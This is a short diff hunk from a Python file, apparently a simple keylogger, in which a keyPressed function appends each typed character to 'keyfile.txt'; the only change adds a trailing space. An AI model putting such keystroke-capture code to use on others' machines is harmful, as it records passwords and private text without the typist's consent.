@@ -5,7 +5,7 @@ def keyPressed(key):
     with open("keyfile.txt", 'a') as logKey:
         try:
             char = key.char
-            logKey.write(char)
+            logKey.write(char) 
         except: 
             print("Error getting char")
 
